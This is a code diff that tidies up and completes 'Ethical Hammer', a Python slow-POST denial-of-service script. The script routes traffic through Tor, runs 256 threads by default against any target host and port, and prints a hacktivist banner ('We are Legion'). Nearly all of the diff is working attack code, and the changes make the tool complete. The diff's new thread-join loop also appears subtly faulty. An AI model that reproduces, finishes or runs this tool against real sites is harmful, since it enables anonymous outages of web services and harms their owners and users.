@@ -1,4 +1,3 @@
-
 #!/usr/bin/python
 import time
 import sys
@@ -7,9 +6,6 @@ import getopt
 import socks
 import string
 from threading import Thread
-from terminal import TerminalController
-
-term = TerminalController()
 
 class EthicalHammer(Thread):
     def __init__(self, host, port, tor):
@@ -20,7 +16,7 @@ class EthicalHammer(Thread):
         self.tor = tor
         self.running = True
 
-    def _send_http_post(self, pause=10):
+    def _send_http_post(self):
         global stop_now
 
         headers = (
@@ -41,7 +37,7 @@ class EthicalHammer(Thread):
                     self.running = False
                     break
                 payload = random.choice(string.ascii_letters + string.digits)
-                print(term.BOL + term.UP + term.CLEAR_EOL + "Posting: %s" % payload + term.NORMAL)
+                print(f"Posting: {payload}")
                 self.socks.send(payload)
                 time.sleep(random.uniform(0.1, 3))
         except Exception as e:
@@ -54,7 +50,7 @@ class EthicalHammer(Thread):
                     self.socks.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
                     time.sleep(1)
                 self.socks.connect((self.host, self.port))
-                print(term.BOL + term.UP + term.CLEAR_EOL + "Connected to host..." + term.NORMAL)
+                print("Connected to host...")
                 self._send_http_post()
             except Exception as e:
                 print("Error:", e)
@@ -62,13 +58,13 @@ class EthicalHammer(Thread):
                 sys.exit()
 
 def usage():
-    print("\033[91m\n/*")
+    print("\n/*")
     print(" * Ethical Hammer ")
     print(" * Slow POST DoS Testing Tool")
     print(" * entropy [at] phiral.net")
     print(" * Anon-ymized via Tor")
     print(" * We are Legion.")
-    print(" */\033[0m\n")
+    print(" */\n")
     print("Usage: ./ethical_hammer.py -t <target> [-r <threads> -p <port> -T -h]")
     print(" -t|--target <Hostname|IP>")
     print(" -r|--threads <Number of threads> Defaults to 256")
@@ -109,11 +105,11 @@ def main(argv):
         usage()
         sys.exit(-1)
 
-    print(term.DOWN + term.RED + "/*" + term.NORMAL)
-    print(term.RED + f" * Target: {target} Port: {port}" + term.NORMAL)
-    print(term.RED + f" * Threads: {threads} Tor: {tor}" + term.NORMAL)
-    print(term.RED + " * Give 20 seconds without Tor or 40 with before checking the site" + term.NORMAL)
-    print(term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL)
+    print("/*")
+    print(f" * Target: {target} Port: {port}")
+    print(f" * Threads: {threads} Tor: {tor}")
+    print(" * Give 20 seconds without Tor or 40 with before checking the site")
+    print(" */")
 
     thread_list = []
     for _ in range(threads):
@@ -123,4 +119,13 @@ def main(argv):
 
     while thread_list:
         try:
-            thread
+            thread_list = [t.join(1) for t in thread_list if t is not None and t.is_alive()]
+        except KeyboardInterrupt:
+            print("\nShutting down threads...\n")
+            for t in thread_list:
+                stop_now = True
+                t.running = False
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
+```
